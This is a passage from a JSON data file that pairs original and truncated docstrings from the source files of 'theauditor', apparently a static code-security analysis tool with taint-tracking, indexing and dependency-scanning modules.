    "original": "\"\"\"\n    Detect Codex session directory by scanning for matching cwd.\n\n    Codex stores sessions in: ~/.codex/sessions/YYYY/MM/DD/*.jsonl\n    Each session has session_meta with cwd field.\n\n    Returns path to ~/.codex/sessions if sessions with matching cwd found.\n    \"\"\"",
    "truncated": "\"\"\"Detect Codex session directory by scanning for matching cwd.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract file path, old code, and new code from tool call.\n\n        Args:\n            tool_call: ToolCall object\n\n        Returns:\n            Tuple of (file_path, old_code, new_code)\n        \"\"\"",
    "truncated": "\"\"\"Extract file path, old code, and new code from tool call.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Run taint analysis on diff (simplified version).\n\n        Args:\n            temp_file: Path to temp file with code\n\n        Returns:\n            Taint risk score (0.0-1.0)\n        \"\"\"",
    "truncated": "\"\"\"Run taint analysis on diff (simplified version).\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if modification is complete via FCE (simplified).\n\n        Args:\n            file_path: Path to file being modified\n\n        Returns:\n            Completeness risk score (0.0-1.0)\n        \"\"\"",
    "truncated": "\"\"\"Check if modification is complete via FCE (simplified).\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get historical risk from RCA stats (simplified).\n\n        Args:\n            file_path: Path to file being modified\n\n        Returns:\n            Historical risk score (0.0-1.0)\n        \"\"\"",
    "truncated": "\"\"\"Get historical risk from RCA stats (simplified).\"\"\""
  },
  {
    "file": "theauditor/session/store.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Query session executions that modified a specific file.\n\n        Args:\n            file_path: File path to search for\n\n        Returns:\n            List of SessionExecution objects\n        \"\"\"",
    "truncated": "\"\"\"Query session executions that modified a specific file.\"\"\""
  },
  {
    "file": "theauditor/session/store.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"SessionExecutionStore - Persist session execution data following dual-write principle.\n\nThis module stores session execution data to:\n1. Database (session_executions table in repo_index.db)\n2. JSON files (.pf/session_analysis/)\n\nImplements dual-write principle: all data written to both storage types for consistency.\n\"\"\"",
    "truncated": "\"\"\"SessionExecutionStore - Persist session execution data following dual-write principle.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if session followed workflow.\n\n        Args:\n            session: Session object to check\n\n        Returns:\n            WorkflowCompliance object with score and violations\n        \"\"\"",
    "truncated": "\"\"\"Check if session followed workflow.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract chronological tool call sequence.\n\n        Args:\n            session: Session object\n\n        Returns:\n            List of ToolCall objects in chronological order\n        \"\"\"",
    "truncated": "\"\"\"Extract chronological tool call sequence.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if aud blueprint was run before modifications.\n\n        Args:\n            sequence: List of tool calls\n\n        Returns:\n            True if blueprint ran before any Edit/Write, False otherwise\n        \"\"\"",
    "truncated": "\"\"\"Check if aud blueprint was run before modifications.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if aud query was used before editing.\n\n        Args:\n            sequence: List of tool calls\n\n        Returns:\n            True if query used appropriately, False otherwise\n        \"\"\"",
    "truncated": "\"\"\"Check if aud query was used before editing.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if files were read before being edited.\n\n        Args:\n            sequence: List of tool calls\n\n        Returns:\n            True if all edits had prior reads, False otherwise\n        \"\"\"",
    "truncated": "\"\"\"Check if files were read before being edited.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Calculate compliance score from checks.\n\n        Args:\n            checks: Dict of check results\n\n        Returns:\n            Compliance score (0.0-1.0)\n        \"\"\"",
    "truncated": "\"\"\"Calculate compliance score from checks.\"\"\""
  },
  {
    "file": "theauditor/taint/__init__.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Taint analysis module - Schema-driven IFDS architecture.\n\nClean architecture after stub removal:\n- IFDS analyzer (Allen et al. 2021)\n- Database-driven source/sink discovery (NO hardcoded patterns)\n- Auto-generated schema cache\n- ZERO FALLBACK POLICY enforced\n\"\"\"",
    "truncated": "\"\"\"Taint analysis module - Schema-driven IFDS architecture.\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Access Path abstraction for field-sensitive taint tracking.\n\nIFDS uses access paths of the form x.f.g to track taint through object fields.\nThis prevents false positives like: req.headers.auth vs req.body.malicious\n\nBased on: \"IFDS Taint Analysis with Access Paths\" (Allen et al., 2021)\nSection 1: Access Paths - page 3\n\"\"\"",
    "truncated": "\"\"\"Access Path abstraction for field-sensitive taint tracking.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get all source patterns for a specific language.\n\n        Args:\n            language: Language identifier (e.g., 'python', 'javascript')\n\n        Returns:\n            Dictionary mapping category to pattern list\n        \"\"\"",
    "truncated": "\"\"\"Get all source patterns for a specific language.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get all sink patterns for a specific language.\n\n        Args:\n            language: Language identifier (e.g., 'python', 'javascript')\n\n        Returns:\n            Dictionary mapping category to pattern list\n        \"\"\"",
    "truncated": "\"\"\"Get all sink patterns for a specific language.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Load safe sink patterns from framework_safe_sinks table.\n\n        Schema:\n            frameworks(id, name, version, language, path, source, package_manager, is_primary)\n            framework_safe_sinks(framework_id, sink_pattern, sink_type, is_safe, reason)\n\n        Note: Must JOIN with frameworks to get language column.\n        \"\"\"",
    "truncated": "\"\"\"Load safe sink patterns from framework_safe_sinks table.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get flattened list of source patterns for a language.\n\n        Args:\n            language: Language identifier ('python', 'javascript', 'rust')\n\n        Returns:\n            List of source patterns (e.g., ['req.body', 'req.params', 'req.query'])\n        \"\"\"",
    "truncated": "\"\"\"Get flattened list of source patterns for a language.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get flattened list of sink patterns for a language.\n\n        Args:\n            language: Language identifier ('python', 'javascript', 'rust')\n\n        Returns:\n            List of sink patterns (e.g., ['execute', 'eval', 'system'])\n        \"\"\"",
    "truncated": "\"\"\"Get flattened list of sink patterns for a language.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get sanitizer patterns for a language (includes global sanitizers).\n\n        Args:\n            language: Language identifier ('python', 'javascript', 'rust')\n\n        Returns:\n            List of sanitizer patterns for the language + global sanitizers\n        \"\"\"",
    "truncated": "\"\"\"Get sanitizer patterns for a language (includes global sanitizers).\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Core taint analysis engine.\n\nThis module contains the main taint analysis function and TaintPath class.\n\nSchema Contract:\n    All queries use build_query() for schema compliance.\n    Table existence is guaranteed by schema contract - no checks needed.\n\"\"\"",
    "truncated": "\"\"\"Core taint analysis engine.\"\"\""
  },
  {
    "file": "theauditor/taint/discovery.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"\nDatabase-driven source and sink discovery.\n\nPhase 3 implementation that discovers sources and sinks from the database\ninstead of using hardcoded patterns. This eliminates the need for manual\npattern maintenance and automatically discovers new sources/sinks as the\ndatabase evolves.\n\"\"\"",
    "truncated": "\"\"\"Database-driven source and sink discovery.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Pre-load the entire data flow graph into memory for O(1) traversal.\n\n        This is the critical optimization that transforms FlowResolver from\n        \"10 million SQL queries\" to \"1 SQL query + RAM lookups\".\n\n        Memory cost: ~50-100MB for large codebases (totally acceptable).\n        Speed gain: 1000x faster traversal.\n        \"\"\"",
    "truncated": "\"\"\"Pre-load the entire data flow graph into memory for O(1) traversal.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect language from file extension.\n\n        Args:\n            file_path: Path to file\n\n        Returns:\n            Language identifier ('python', 'javascript', 'rust', 'unknown')\n        \"\"\"",
    "truncated": "\"\"\"Detect language from file extension.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get successor nodes from in-memory graph cache (O(1) lookup).\n\n        Args:\n            node_id: Current node ID (format: file::function::variable)\n\n        Returns:\n            List of successor node IDs\n        \"\"\"",
    "truncated": "\"\"\"Get successor nodes from in-memory graph cache (O(1) lookup).\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if two access paths represent the same data.\n\n        Args:\n            ap1, ap2: Access paths to compare\n\n        Returns:\n            True if paths definitely match\n        \"\"\"",
    "truncated": "\"\"\"Check if two access paths represent the same data.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Convert source/sink dict to AccessPath.\n\n        Args:\n            node_dict: Dict with 'file', 'line', 'name', 'pattern'\n\n        Returns:\n            AccessPath or None if cannot parse\n        \"\"\"",
    "truncated": "\"\"\"Convert source/sink dict to AccessPath.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect language from file extension.\n\n        Args:\n            file_path: Path to file\n\n        Returns:\n            Language identifier ('python', 'javascript', 'rust', 'unknown')\n        \"\"\"",
    "truncated": "\"\"\"Detect language from file extension.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Load safe sink patterns from framework_safe_sinks table.\n\n        These are function name patterns that are known to sanitize data\n        (e.g., escape functions, parameterized query builders).\n\n        Schema: framework_safe_sinks(framework_id, sink_pattern, sink_type, is_safe, reason)\n        Note: Column is 'sink_pattern' NOT 'pattern' (fixed 2025-11-27)\n        \"\"\"",
    "truncated": "\"\"\"Load safe sink patterns from framework_safe_sinks table.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if a function name matches any safe sink pattern.\n\n        Args:\n            function_name: Function name to check\n\n        Returns:\n            True if function matches a safe sink pattern\n        \"\"\"",
    "truncated": "\"\"\"Check if a function name matches any safe sink pattern.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect language from file extension.\n\n        Args:\n            file_path: Path to file\n\n        Returns:\n            Language identifier ('python', 'javascript', 'rust', 'unknown')\n        \"\"\"",
    "truncated": "\"\"\"Detect language from file extension.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Shared sanitizer detection utilities for taint analysis.\n\nThis module provides a unified SanitizerRegistry class used by both\nIFDSTaintAnalyzer (backward) and FlowResolver (forward) to ensure\nconsistent sanitizer detection logic across all taint analysis engines.\n\nNO FALLBACKS. NO EXCEPTIONS. Database-first architecture.\n\"\"\"",
    "truncated": "\"\"\"Shared sanitizer detection utilities for taint analysis.\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Parse metadata JSON and extract model name.\n\n        Args:\n            metadata_str: JSON string from nodes.metadata column\n\n        Returns:\n            Model name if found, None otherwise\n        \"\"\"",
    "truncated": "\"\"\"Parse metadata JSON and extract model name.\"\"\""
  },
  {
    "file": "theauditor/terraform/analyzer.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Terraform security analyzer.\n\n⚠️ DEPRECATED: Direct use of this module is maintained for backward\ncompatibility with aud terraform analyze. New code should invoke the\nstandardized rule at theauditor.rules.terraform.terraform_analyze via the\nrule orchestrator. This wrapper now delegates to that rule and preserves the\nlegacy TerraformFinding format plus database dual-writes.\n\"\"\"",
    "truncated": "\"\"\"Terraform security analyzer.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Format findings as a human-readable table.\n\n        Args:\n            max_rows: Maximum number of rows to display\n\n        Returns:\n            Formatted table string\n        \"\"\"",
    "truncated": "\"\"\"Format findings as a human-readable table.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Export findings to JSON.\n\n        Args:\n            output_file: Optional file path to write JSON\n\n        Returns:\n            JSON string\n        \"\"\"",
    "truncated": "\"\"\"Export findings to JSON.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Load file into cache, return lines or None on error.\n\n        Args:\n            file_path: Relative path from root_dir\n\n        Returns:\n            List of lines (with newlines stripped) or None on error\n        \"\"\"",
    "truncated": "\"\"\"Load file into cache, return lines or None on error.\"\"\""
  },
  {
    "file": "theauditor/utils/exit_codes.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get human-readable description for an exit code.\n\n        Args:\n            code: The exit code to describe\n\n        Returns:\n            Human-readable description of the exit code's meaning\n        \"\"\"",
    "truncated": "\"\"\"Get human-readable description for an exit code.\"\"\""
  },
  {
    "file": "theauditor/utils/exit_codes.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Determine if an exit code should fail a CI/CD pipeline.\n\n        Args:\n            code: The exit code to check\n\n        Returns:\n            True if the code indicates a failure that should stop the pipeline\n        \"\"\"",
    "truncated": "\"\"\"Determine if an exit code should fail a CI/CD pipeline.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Helper utility functions for TheAuditor.\n\nIMPORTANT UTILITIES:\n- normalize_path_for_db(): Use this for ANY database query involving file paths.\n  The database stores Unix-style relative paths (e.g., 'theauditor/cli.py'),\n  but users may pass Windows absolute paths (e.g., 'C:\\\\Users\\\\...\\\\cli.py').\n  This function normalizes both to match.\n\"\"\"",
    "truncated": "\"\"\"Helper utility functions for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/utils/rate_limiter.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Async rate limiting utilities for network operations.\n\nProvides throttled concurrency for API calls to avoid 429 bans while\nmaintaining good throughput. Used by deps.py and docs_fetch.py.\n\nKey insight: Semaphore limits WIDTH (concurrent requests), RateLimiter\nlimits SPEED (request frequency). You need both for polite scraping.\n\"\"\"",
    "truncated": "\"\"\"Async rate limiting utilities for network operations.\"\"\""
  },
  {
    "file": "theauditor/utils/temp_manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get the project-specific temp directory.\n\n        Args:\n            root_path: Project root directory\n\n        Returns:\n            Path to temp directory (.auditor_venv/tmp/)\n        \"\"\"",
    "truncated": "\"\"\"Get the project-specific temp directory.\"\"\""
  },
  {
    "file": "theauditor/utils/temp_manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Clean up all temporary files in project temp directory.\n\n        Args:\n            root_path: Project root directory\n\n        Returns:\n            True if cleanup successful, False otherwise\n        \"\"\"",
    "truncated": "\"\"\"Clean up all temporary files in project temp directory.\"\"\""
  },
  {
    "file": "theauditor/utils/temp_manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get project-specific temp directory.\n\n    Args:\n        root_path: Project root directory\n\n    Returns:\n        Path to temp directory\n    \"\"\"",
    "truncated": "\"\"\"Get project-specific temp directory.\"\"\""
  },
  {
    "file": "theauditor/utils/temp_manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Clean up project temp directory.\n\n    Args:\n        root_path: Project root directory\n\n    Returns:\n        True if successful\n    \"\"\"",
    "truncated": "\"\"\"Clean up project temp directory.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Initialize with project root directory.\n\n        Args:\n            project_root: Path to project root (where .auditor_venv exists)\n\n        Raises:\n            ValueError: If project_root doesn't exist or isn't a directory\n        \"\"\"",
    "truncated": "\"\"\"Initialize with project root directory.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Find bundled osv-scanner binary.\n\n        Returns:\n            Path to osv-scanner executable\n\n        Raises:\n            FileNotFoundError: If osv-scanner is not found in either location\n        \"\"\"",
    "truncated": "\"\"\"Find bundled osv-scanner binary.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Format vulnerabilities as human-readable report.\n\n    Args:\n        vulnerabilities: List of vulnerability findings\n\n    Returns:\n        Formatted report string\n    \"\"\"",
    "truncated": "\"\"\"Format vulnerabilities as human-readable report.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Extract ALL return statements from TypeScript semantic AST, including JSX.\n\n    CRITICAL FIXES:\n    - Uses line-based scope mapping for accurate function context\n    - Tracks multiple returns per function (early returns, conditionals)\n    - Properly detects and preserves JSX returns for React components\n    \"\"\"",
    "truncated": "\"\"\"Extract ALL return statements from TypeScript semantic AST, including JSX.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Store an AST tree in the cache.\n\n        Args:\n            key: SHA256 hash of the file content\n            value: AST tree to cache (must be JSON serializable)\n            context: Additional context (unused)\n        \"\"\"",
    "truncated": "\"\"\"Store an AST tree in the cache.\"\"\""
  },
  {
    "file": "theauditor/config.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Ensure minimal mypy config exists in pyproject.toml.\n\n    Returns:\n        {\"status\": \"created\"} if config was added\n        {\"status\": \"exists\"} if config already present\n    \"\"\"",
    "truncated": "\"\"\"Ensure minimal mypy config exists in pyproject.toml.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Initialize formatter.\n\n        Args:\n            snippet_manager: CodeSnippetManager instance for reading snippets\n            show_code: If True, include code snippets in output\n            limit: Max items per section (from CLI --limit)\n        \"\"\"",
    "truncated": "\"\"\"Initialize formatter.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Fetch latest Docker tag from Docker Hub (async).\n\n    SAFETY RULES:\n    - NEVER return \"latest\" as a fallback (that's not a version!)\n    - Prefer clean tags (e.g., \"3.4.1\" over \"3.4.1-ubuntu-timestamp\")\n    - Respect base image preference (alpine user stays on alpine)\n    \"\"\"",
    "truncated": "\"\"\"Fetch latest Docker tag from Docker Hub (async).\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Save the dependency version cache to repo_index.db.\n    Uses INSERT OR REPLACE to update existing entries.\n    Creates table if it doesn't exist (for standalone aud deps usage).\n\n    Key format: \"manager:package_name:locked_version\" (Universal Keys - Tweak 2)\n    \"\"\"",
    "truncated": "\"\"\"Save the dependency version cache to repo_index.db.\"\"\""
  },
  {
    "file": "theauditor/docs_fetch.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Async documentation fetcher.\n\n    Architecture:\n    - First pass: Check cache (no network)\n    - Second pass: Fetch missing docs in parallel with rate limiting\n    \"\"\"",
    "truncated": "\"\"\"Async documentation fetcher.\"\"\""
  },
  {
    "file": "theauditor/fce.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Factual Correlation Engine - aggregates and correlates findings from all analysis tools.\n\nCRITICAL ARCHITECTURE RULE: NO FALLBACKS ALLOWED.\nThe database is generated fresh every run. It MUST exist and MUST contain all required data.\nNO JSON fallbacks, NO graceful degradation, NO try/except to handle missing data.\nHard failure is the only acceptable behavior. If data is missing, the pipeline should crash.\n\"\"\"",
    "truncated": "\"\"\"Factual Correlation Engine - aggregates and correlates findings from all analysis tools.\"\"\""
  },
  {
    "file": "theauditor/graph/builder.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Return call argument metadata for the given file.\n\n        ZERO FALLBACK: If database missing, __init__ already crashed.\n        If query fails, let SQLite error propagate (exposes schema bug).\n\n        Note: Not cached yet (complex JOIN query). Future optimization target.\n        \"\"\"",
    "truncated": "\"\"\"Return call argument metadata for the given file.\"\"\""
  },
  {
    "file": "theauditor/graph/builder.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Build cross-project dependency and call graphs.\n\n    This builder operates in database-first mode, reading all extraction data\n    (imports, exports, calls) from the repo_index.db populated by the indexer.\n    No regex-based extraction fallbacks exist - if data is not in the database,\n    the extraction will return empty results, allowing us to identify edge cases.\n    \"\"\"",
    "truncated": "\"\"\"Build cross-project dependency and call graphs.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n        Save analysis result to database.\n\n        Args:\n            analysis_type: Type of analysis (e.g., 'cycles', 'hotspots')\n            result: Analysis result dict\n        \"\"\"",
    "truncated": "\"\"\"Save analysis result to database.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_orm.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Node.js ORM Strategy - Handles Sequelize/TypeORM/Prisma relationship expansion.\n\nThis strategy builds edges for Node.js ORM relationships, enabling taint tracking\nthrough model relationships (e.g., User.posts -> Post instances).\n\nCreated as part of refactor-polyglot-taint-engine (2025-11-27).\n\"\"\"",
    "truncated": "\"\"\"Node.js ORM Strategy - Handles Sequelize/TypeORM/Prisma relationship expansion.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Clear all existing data from tables using schema.py registry.\n\n        ARCHITECTURE: Schema-driven table clearing.\n        - Loops over TABLES registry from schema.py\n        - Executes DELETE FROM for each table\n        - NO hardcoded table list (48 lines → 10 lines)\n        \"\"\"",
    "truncated": "\"\"\"Clear all existing data from tables using schema.py registry.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Mixin providing add_* methods for GRAPHQL_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n\n    NO FALLBACKS. NO TRY/EXCEPT. Hard fail if data is wrong.\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for GRAPHQL_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Add a GitHub Actions step output declaration.\n\n        Args:\n            step_id: FK to github_steps\n            output_name: Output key\n            output_expression: Value expression\n        \"\"\"",
    "truncated": "\"\"\"Add a GitHub Actions step output declaration.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Add an advanced Python function pattern to the batch.\n\n        Args:\n            function_kind: 'generator', 'async', 'lambda', 'context_manager', 'async_generator',\n                          'recursive', 'memoized' (discriminator)\n            function_type: Extractor's subtype - NOT overwritten\n        \"\"\"",
    "truncated": "\"\"\"Add an advanced Python function pattern to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Add a Python I/O operation to the batch.\n\n        Args:\n            io_kind: 'file', 'network', 'database', 'process', 'param_flow',\n                    'closure', 'nonlocal', 'conditional' (discriminator)\n            io_type: Extractor's subtype - NOT overwritten\n        \"\"\"",
    "truncated": "\"\"\"Add a Python I/O operation to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Add a Python class feature to the batch.\n\n        Args:\n            feature_kind: 'metaclass', 'dataclass', 'enum', 'slots', 'abstract',\n                         'method_type', 'dunder', 'visibility', 'class_decorator', 'inheritance'\n            feature_type: Preserved subtype from extractor\n        \"\"\"",
    "truncated": "\"\"\"Add a Python class feature to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Add a Python descriptor to the batch.\n\n        Args:\n            descriptor_kind: 'property', 'descriptor', 'dynamic_attr', 'cached_property',\n                            'descriptor_protocol', 'attr_access'\n            descriptor_type: Preserved subtype from extractor\n        \"\"\"",
    "truncated": "\"\"\"Add a Python descriptor to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Add a Python security finding to the batch.\n\n        Args:\n            finding_kind: Discriminator: 'auth', 'command_injection', 'crypto',\n                         'dangerous_eval', 'jwt', 'password', 'path_traversal', 'sql_injection'\n            finding_type: Extractor's subtype (preserved)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python security finding to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Add a Python expression pattern to the batch.\n\n        Args:\n            expression_kind: Discriminator: 'slice', 'tuple', 'unpack', 'none', 'truthiness',\n                            'format', 'ellipsis', 'bytes', 'exec', 'yield', 'await', 'resource'\n            expression_type: Extractor's subtype (preserved)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python expression pattern to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Clean up extractor resources after all files processed.\n\n        Override this if extractor maintains persistent resources\n        (LSP sessions, database connections, temp directories).\n\n        Default: no-op.\n        \"\"\"",
    "truncated": "\"\"\"Clean up extractor resources after all files processed.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/github_actions.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Extract steps and their references to database.\n\n        Args:\n            workflow_path: Path to workflow file\n            job_id: Parent job ID\n            steps: List of step dicts from job YAML\n        \"\"\"",
    "truncated": "\"\"\"Extract steps and their references to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/prisma.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Prisma schema extractor - Database-First Architecture.\n\nExtracts Prisma ORM model definitions from schema.prisma files.\nInlines parsing logic (no separate parser class).\n\nPopulates prisma_models table for use by rules/orm/prisma_analyze.py.\n\"\"\"",
    "truncated": "\"\"\"Prisma schema extractor - Database-First Architecture.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Call cleanup() on all registered extractors.\n\n        This allows extractors to release persistent resources like:\n        - LSP sessions (Rust, TypeScript)\n        - Database connections\n        - Temporary directories\n        \"\"\"",
    "truncated": "\"\"\"Call cleanup() on all registered extractors.\"\"\""
  },
  {
    "file": "theauditor/indexer/runner.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Indexer workflow runner.\n\nThis module provides the high-level workflow for running the indexing process.\nReplaces the legacy build_index() shim from indexer_compat.py.\n\n2025 Modern: Clean entry point for pipelines.py, no backward compat baggage.\n\"\"\"",
    "truncated": "\"\"\"Indexer workflow runner.\"\"\""
  },
  {
    "file": "theauditor/indexer/schema.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Validate all table schemas against actual database.\n\n    Returns:\n        Dict of {table_name: [errors]} for tables with mismatches.\n        Empty dict means all schemas are valid.\n    \"\"\"",
    "truncated": "\"\"\"Validate all table schemas against actual database.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/node_storage.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Store Vue component PARENT RECORDS ONLY.\n\n        Junction data (props, emits, setup_returns) stored via dedicated handlers:\n        - _store_vue_component_props()\n        - _store_vue_component_emits()\n        - _store_vue_component_setup_returns()\n        \"\"\"",
    "truncated": "\"\"\"Store Vue component PARENT RECORDS ONLY.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Load RCA failure stats from all historical RCA files.\n\n    Args:\n        history_dir: Base history directory\n        run_type: Type of runs to load (\"full\", \"diff\", or \"all\")\n    \"\"\"",
    "truncated": "\"\"\"Load RCA failure stats from all historical RCA files.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 7,
